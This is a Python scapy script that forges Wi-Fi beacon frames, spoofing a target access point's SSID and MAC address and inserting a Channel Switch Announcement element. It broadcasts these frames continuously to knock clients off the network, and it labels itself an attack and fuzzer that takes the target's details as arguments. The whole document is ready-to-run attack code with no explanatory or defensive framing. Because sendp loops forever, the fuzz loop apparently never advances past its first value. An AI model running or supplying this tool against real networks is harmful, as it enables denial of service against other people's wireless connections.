from scapy.all import *
import sys

def csa_attack(iface, ssid, i):
    print('[*] CSA Attack!')
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=ap_mac, addr3=ap_mac)
    beacon = Dot11Beacon(cap=0o411)
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    csa = Dot11Elt(ID=0x25,len=3,info=bytes([0,i,1]))
    frame = RadioTap()/dot11/beacon/essid/csa
    print('[*] Start...!!')
    sendp(frame, iface=iface, inter=0.004, loop=1)

def csa_fuzz(iface,ssid):
    print('[*] CSA Fuzzer!!!!')
    for i in range(0xff, 0x0, -1):
        print('[*] Number : {0}'.format(i))
        csa_attack(iface, ssid, i)


if __name__ == '__main__':
    args = sys.argv
    if len(args)<4:
        print('python3 {0} <iface> <target ssid> <target AP MAC>'.format(args[0]))
        exit()

    iface = args[1]
    ssid = args[2]
    ap_mac = args[3]
    csa_fuzz(iface,ssid)



